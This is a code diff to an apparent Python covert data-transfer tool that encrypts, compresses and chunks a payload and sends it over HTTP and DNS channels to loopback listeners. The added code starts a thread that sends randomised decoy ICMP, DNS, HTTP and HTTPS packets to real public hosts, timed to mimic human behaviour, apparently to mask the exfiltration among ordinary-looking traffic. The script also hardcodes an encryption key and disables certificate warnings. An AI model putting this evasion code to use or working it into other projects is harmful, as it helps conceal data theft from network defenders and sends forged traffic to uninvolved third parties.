@@ -8,14 +8,14 @@ import hashlib
 import requests
 import ssl
 import string
+import socket
 from flask import Flask, request, jsonify
-from scapy.all import IP, ICMP, UDP, Raw, send, sniff, DNS, DNSQR
+from scapy.all import IP, ICMP, UDP, Raw, send, sniff, DNS, DNSQR, TCP
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 
 # Configuration
 SECRET_KEY = "mysecretkey12345"
@@ -302,12 +302,73 @@ def debug_received_chunks():
         for idx, chunk in sorted(received_chunks.items()):
             print(f" - Chunk index {idx}: {chunk}")
 
+# Dummy Traffic Sender
+def send_dummy_traffic():
+    while not stop_sniffer.is_set():
+        try:
+            # Decide randomly which dummy traffic to send
+            traffic_type = random.choice(['icmp', 'dns', 'http', 'https'])
+            if traffic_type == 'icmp':
+                send_dummy_icmp()
+            elif traffic_type == 'dns':
+                send_dummy_dns()
+            elif traffic_type == 'http':
+                send_dummy_http()
+            elif traffic_type == 'https':
+                send_dummy_https()
+            # Random sleep to mimic human behavior
+            time.sleep(random.uniform(0.5, 2))
+        except Exception as e:
+            print(f"[Dummy Traffic] Error in dummy traffic thread: {e}")
+
+# Dummy ICMP Traffic Sender
+def send_dummy_icmp():
+    target_ip = random.choice(['8.8.8.8', '1.1.1.1'])
+    dummy_payload = os.urandom(random.randint(32, 64))  # Random binary data
+    sequence_number = random.randint(0, 65535)
+    ttl_value = random.randint(30, 128)
+    packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type='echo-request', seq=sequence_number) / Raw(load=dummy_payload)
+    send(packet, verbose=False)
+    print(f"[Dummy ICMP] Sent dummy ICMP echo request to {target_ip}")
+
+# Dummy DNS Traffic Sender
+def send_dummy_dns():
+    domain = random.choice(['google.com', 'facebook.com', 'amazon.com', 'github.com'])
+    dns_server = random.choice(dns_servers)
+    packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
+    send(packet, verbose=False)
+    print(f"[Dummy DNS] Sent dummy DNS query for {domain} to {dns_server}")
+
+# Dummy HTTP Traffic Sender
+def send_dummy_http():
+    try:
+        host = random.choice(['example.com', 'test.com', 'mywebsite.com'])
+        path = random.choice(['/index.html', '/about', '/contact'])
+        http_payload = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: DummyAgent\r\n\r\n".encode()
+        packet = IP(dst=host) / TCP(dport=80, sport=random.randint(1024, 65535), flags='S') / Raw(load=http_payload)
+        send(packet, verbose=False)
+        print(f"[Dummy HTTP] Sent dummy HTTP GET request to {host}{path}")
+    except Exception as e:
+        print(f"[Dummy HTTP] Error: {e}")
+
+# Dummy HTTPS Traffic Sender
+def send_dummy_https():
+    host = random.choice(['secure.com', 'bank.com', 'login.com'])
+    tls_payload = os.urandom(random.randint(64, 128))  # Random binary data to simulate TLS handshake
+    try:
+        target_ip = socket.gethostbyname(host)
+        packet = IP(dst=target_ip) / TCP(dport=443, sport=random.randint(1024, 65535), flags='S') / Raw(load=tls_payload)
+        send(packet, verbose=False)
+        print(f"[Dummy HTTPS] Sent dummy HTTPS Client Hello to {host}")
+    except socket.gaierror:
+        print(f"[Dummy HTTPS] Failed to resolve host {host}")
+
 # Main
 if __name__ == "__main__":
     target_ip = "127.0.0.1"  # Use loopback IP
     http_server_ip = "127.0.0.1"  # Use loopback IP
     dns_server_ip = "127.0.0.1"   # Use loopback IP
-    
+
     # Use random payload to avoid over-compression
     text_payload = generate_random_payload(1500)  # Adjust the length as needed
     encrypted_payload = encrypt_and_compress_payload(text_payload)
@@ -324,6 +385,8 @@ if __name__ == "__main__":
     threading.Thread(target=dns_listener, daemon=True).start()
 
     time.sleep(2)  # Allow server to initialize
+
+    threading.Thread(target=send_dummy_traffic, daemon=True).start()
 
     # Send payload
     print("[Main] Sending payload over HTTP...")
